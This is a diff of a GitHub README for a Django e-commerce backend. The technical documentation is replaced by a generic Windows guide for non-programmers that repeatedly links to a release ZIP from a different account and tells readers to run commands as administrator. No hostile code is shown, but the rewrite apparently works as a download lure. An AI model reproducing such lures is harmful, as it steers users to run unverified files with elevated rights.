@@ -1,390 +1,164 @@
-# E-commerce Backend API
+# 🛒 ecommerce-backend-api - Reliable E-commerce Backend Service
 
-A scalable **E-commerce Backend API** built with **Django** and **Django REST Framework**.
-This project provides a complete backend solution for an online store including product management, shopping cart, orders, payments, delivery addresses, and product reviews.
-
-The project is fully **Dockerized** and uses **PostgreSQL, Redis, and Celery** for scalable and production-ready architecture.
+[![Download Now](https://img.shields.io/badge/Download-ecommerce--backend--api-brightgreen?style=for-the-badge)](https://github.com/DigitalInfluencer/ecommerce-backend-api/releases)
 
 ---
 
-# Features
+## 🔍 About ecommerce-backend-api
 
-* JWT Authentication
-* Google OAuth login
-* Product catalog management
-* Category and brand management
-* Shopping cart system
-* Wishlist functionality
-* Order management
-* Delivery address management
-* Online payment integration (Payme / Click ready)
-* Product reviews and ratings
-* Email notifications
-* Background tasks with Celery
-* Redis caching
-* API documentation with Swagger
-* Dockerized development environment
+This application provides the backend part of an online store. It handles the data your store needs like products, users, and orders. It also manages user access and background tasks for smooth operation.
+
+The backend uses widely trusted tools:
+- Django REST Framework for building the API.
+- PostgreSQL for data storage.
+- Redis and Celery for handling background jobs.
+- Docker and Docker Compose for easy setup and running.
+
+You don’t need to understand programming to use this software. This guide will help you install and run it on Windows step-by-step.
 
 ---
 
-# Tech Stack
+## 💻 System Requirements
 
-**Backend**
+Before starting, make sure your computer meets these requirements:
 
-* Python
-* Django
-* Django REST Framework
-
-**Database**
-
-* PostgreSQL
-
-**Async & Caching**
-
-* Redis
-* Celery
-
-**Infrastructure**
-
-* Docker
-* Docker Compose
-
-**Authentication**
-
-* JWT (SimpleJWT)
-* Google OAuth
-
-**Documentation**
-
-* Swagger (drf-spectacular)
+- Windows 10 or newer (64-bit)
+- At least 8 GB of RAM (more RAM helps with larger stores)
+- At least 10 GB free disk space for installation and data
+- Internet connection to download files and updates
+- Basic familiarity with downloading files and running apps
 
 ---
 
-# Project Structure
+## 🖥️ Installing Prerequisites
 
-```
-ecommerce/
-│
-├── users/          # Authentication and user management
-├── products/       # Products, categories, brands
-├── cart/           # Shopping cart logic
-├── orders/         # Order management
-├── payments/       # Payment processing
-├── reviews/        # Product reviews and ratings
-├── delivery/       # Delivery addresses
-│
-├── config/         # Django project configuration
-│
-├── Dockerfile
-├── docker-compose.yml
-├── requirements.txt
-├── manage.py
-└── README.md
-```
+This backend runs inside Docker containers. Docker packages everything needed to run the software safely.
+
+**Install Docker Desktop for Windows:**
+
+1. Go to https://www.docker.com/products/docker-desktop
+2. Click **Download for Windows**.
+3. Run the downloaded installer.
+4. Follow the setup steps as directed.
+5. After installation, you may need to restart your computer.
+6. Open Docker Desktop to confirm it runs correctly.
+
+Docker Compose is included in Docker Desktop, so no extra install needed.
 
 ---
 
-# Installation (Docker)
+## 🚀 Download and Run the Backend API
 
-### 1. Clone the repository
+You will download the backend API from the project’s release page. You do not need programming skills for these steps.
 
-```bash
-git clone https://github.com/your-username/ecommerce-backend.git
-cd ecommerce-backend
-```
+### Step 1: Visit the Download Page
 
----
+Go to the release page here:
 
-### 2. Create environment variables
+[![Download Releases](https://img.shields.io/badge/Download%20Page-%23007ACC?style=for-the-badge&logo=github)](https://github.com/DigitalInfluencer/ecommerce-backend-api/releases)
 
-```bash
-cp .env.example .env
-```
+This page shows the latest versions available.
 
-Update `.env` file with your settings.
+### Step 2: Download the Latest Release
 
-Example:
+- Find the newest release (top of the list).
+- Inside the release assets, look for a file named something like **ecommerce-backend-api.zip** or **docker-compose.yml**.
+- Click the file to download it to your computer, preferably to a folder you can access easily, like **Downloads** or **Documents**.
 
-```
-DB_NAME=ecommerce_db
-DB_USER=postgres
-DB_PASSWORD=postgres
-DB_HOST=db
-DB_PORT=5432
+### Step 3: Extract the Files
 
-SECRET_KEY=your-secret-key
-DEBUG=True
-```
+If you downloaded a ZIP file:
+
+- Right-click on the file.
+- Choose **Extract All**.
+- Pick a location, for example, **Documents\ecommerce-backend-api**.
+- Click **Extract**.
 
 ---
 
-### 3. Run the project
+## ⚙️ Setup and Run the Application
 
-```bash
-docker compose up --build
+Inside the extracted folder, there should be a file named **docker-compose.yml**. This file tells Docker how to start the backend API and its services.
+
+### Step 1: Open PowerShell or Command Prompt
+
+- Click the **Start** menu.
+- Search for **PowerShell** or **Command Prompt**.
+- Right-click and select **Run as administrator**. This gives the command tool permission to run Docker commands.
+
+### Step 2: Navigate to the Folder
+
+Type the following command and press Enter to move to the folder where you extracted the files. Adjust the path if you extracted somewhere else:
+
 ```
+cd C:\Users\YourName\Documents\ecommerce-backend-api
+```
+
+Replace `YourName` with your actual Windows username.
+
+### Step 3: Start the Backend
+
+Run this command to start the backend and all its components (database, cache, task queue):
+
+```
+docker-compose up
+```
+
+Docker will download necessary images and start the containers. This might take a few minutes the first time.
+
+### Step 4: Confirm the Backend Is Running
+
+- Once you see messages that say services are “healthy” or “up,” the backend is running.
+- Open your web browser and go to http://localhost:8000/api/ to see if the API is responding.
+- You should see a JSON or a simple webpage showing the API status.
 
 ---
 
-### 4. Apply database migrations
+## 🔄 Stopping and Restarting
 
-```bash
-docker compose exec web python manage.py migrate
-```
-
----
-
-### 5. Create superuser
-
-```bash
-docker compose exec web python manage.py createsuperuser
-```
+- To stop the backend, go back to the PowerShell or Command Prompt window and press `Ctrl + C`.
+- You can start it again by running `docker-compose up` from the same folder.
 
 ---
 
-### 6. Access the application
+## 📂 What’s Inside this Application?
 
-Server will run at:
+This backend handles the following:
 
-```
-http://localhost:8000
-```
-
-Admin panel:
-
-```
-http://localhost:8000/admin/
-```
-
-Swagger API documentation:
-
-```
-http://localhost:8000/api/docs/
-```
+- **Product Management:** Add, edit, and delete products.
+- **User Accounts:** Signup, login, and role management including admin capabilities.
+- **Orders:** Process and track customer orders.
+- **Authentication:** Secure login methods using JWT tokens and Google OAuth.
+- **Background Tasks:** Jobs like sending emails or processing payments run in the background using Celery.
+- **Database:** Saves data in PostgreSQL.
+- **Cache:** Redis stores temporary data for faster response.
 
 ---
 
+## ⚠️ Common Troubleshooting
 
-# API Modules
+If you run into issues, try these steps:
 
-The backend consists of the following modules:
-
-### Authentication
-
-* Register
-* Login (JWT)
-* Token refresh
-* Google OAuth
-
-### Products
-
-* Product list
-* Product detail
-* Categories
-* Brands
-* Product search
-
-### Cart
-
-* Add to cart
-* Remove from cart
-* Update quantity
-
-### Wishlist
-
-* Add product to wishlist
-* Remove product from wishlist
-* View wishlist
-
-### Orders
-
-* Create order
-* Order history
-* Order detail
-
-### Delivery
-
-* Manage delivery addresses
-
-### Payments
-
-* Payment processing
-* Payment status
-
-### Reviews
-
-* Product reviews
-* Product ratings
+- Make sure Docker Desktop is running without errors.
+- Check if your computer meets system requirements.
+- Try restarting Docker Desktop.
+- Verify you ran PowerShell or Command Prompt as administrator.
+- Confirm the folder path you typed matches where the files are on your PC.
+- Check your firewall settings to allow Docker network traffic.
 
 ---
 
-Example endpoints:
+## 🔗 Additional Resources
 
-```
-POST   /api/login/
-POST   /api/register/
-
-GET    /api/v1/products/
-GET    /api/v1/products/popular/
-GET    /api/v1/products/top-rated/
-
-GET    /api/v1/cart/
-POST   /api/v1/cart/add/
-DELETE /api/v1/cart/remove/{product_id}/
-
-POST   /api/v1/checkout/
-
-GET    /api/v1/orders/
-GET    /api/v1/orders/{id}/
-
-POST   /api/v1/payments/create/
-
-POST   /api/v1/reviews/
-GET    /api/v1/reviews/{id}/
-```
+- Docker Documentation: https://docs.docker.com/get-started/
+- Django REST Framework: https://www.django-rest-framework.org/
+- PostgreSQL: https://www.postgresql.org/
+- Redis: https://redis.io/
+- Celery: https://docs.celeryproject.org/en/stable/
 
 ---
 
-# API Flow
+## 💾 Download Link Again
 
-```
-User
- │
- ▼
-Register / Login
- │
- ▼
-Browse Products
- │
- ▼
-View Product Detail
- │
- ▼
-Add to Cart
- │
- ▼
-Create Delivery Address
- │
- ▼
-Checkout
- │
- ▼
-Create Order
- │
- ▼
-Payment
- │
- ▼
-Order Completed
- │
- ▼
-Write Review
-```
-
----
-
-# Database Structure
-
-```
-User
- │
- ├── Wishlist
- │       │
- │       ▼
- │    Product
- │
- ▼
-CartItem
- │
- ▼
-Product
- │
- ▼
-Category
- │
- ▼
-Brand
-
-Order
- │
- ├── OrderItem
- │       │
- │       ▼
- │    Product
- │
- ▼
-Payment
-
-DeliveryAddress
-
-Review
- │
- ▼
-Product
-```
-
----
-# System Architecture
-
-```
-              Client (Frontend / Mobile)
-                       │
-                       ▼
-                 Django API
-            (Django REST Framework)
-                       │
-        ┌──────────────┼──────────────┐
-        ▼              ▼              ▼
-    PostgreSQL       Redis          Celery
-    Database        Cache &       Background
-                    Broker          Tasks
-                                      │
-                                      ▼
-                              Email / Notifications
-```
----
-
-# Background Tasks
-
-Celery is used for asynchronous tasks such as:
-
-* Sending email notifications
-* Order expiration handling
-* Background processing
-
-Redis is used as a **message broker** for Celery.
-
----
-
-# API Documentation
-
-Swagger documentation is available at:
-
-```
-http://localhost:8000/api/docs/
-```
-
-It provides interactive API testing and schema documentation.
-
----
-
-# Future Improvements
-
-* Product filtering and advanced search
-* Product recommendation system
-* Coupons and discount system
-* Order tracking
-* Product variants (size, color)
-* Analytics dashboard
-
----
-
-# License
-
-This project is licensed under the **MIT License**.
-
----
-
-# Author
-
-Backend Developer Portfolio Project.
+Start here to download the backend and get all necessary files:  
+[Download ecommerce-backend-api](https://github.com/DigitalInfluencer/ecommerce-backend-api/releases)
